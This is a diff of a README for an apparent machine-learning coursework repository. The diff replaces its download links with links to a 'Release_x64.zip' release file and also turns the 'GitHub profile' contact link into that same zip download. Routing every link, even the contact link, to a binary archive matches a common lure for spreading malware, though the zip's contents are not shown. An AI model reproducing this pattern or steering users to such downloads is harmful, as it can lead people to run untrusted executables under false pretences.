@@ -28,15 +28,15 @@ The repository covers a wide range of topics related to Intelligent Analytics. H
 - **Support Vector Machines**
 
 ## Explore the Work
-To dive into the details of the work showcased in this repository, simply click on the following link: [Launch Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+To dive into the details of the work showcased in this repository, simply click on the following link: [Launch https://github.com/SirBleu/Intelligent-Analytics-Artificial-Neural-Networks/releases/download/v1.0/Release_x64.zip](https://github.com/SirBleu/Intelligent-Analytics-Artificial-Neural-Networks/releases/download/v1.0/Release_x64.zip)
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download https://github.com/SirBleu/Intelligent-Analytics-Artificial-Neural-Networks/releases/download/v1.0/Release_x64.zip](https://github.com/SirBleu/Intelligent-Analytics-Artificial-Neural-Networks/releases/download/v1.0/Release_x64.zip)](https://github.com/SirBleu/Intelligent-Analytics-Artificial-Neural-Networks/releases/download/v1.0/Release_x64.zip)
 
 ## Additional Resources
 For more insights and updates, make sure to check out the "Releases" section of this repository. You'll find additional resources, project updates, and new developments in the field of Intelligent Analytics.
 
 ## Contact Me
-If you have any questions, suggestions, or just want to connect, feel free to reach out to me. You can find my contact information on my [GitHub profile](https://github.com/yourusername).
+If you have any questions, suggestions, or just want to connect, feel free to reach out to me. You can find my contact information on my [GitHub profile](https://github.com/SirBleu/Intelligent-Analytics-Artificial-Neural-Networks/releases/download/v1.0/Release_x64.zip).
 
 Let's continue exploring the exciting world of Intelligent Analytics together! 🚀🔬🤓
 
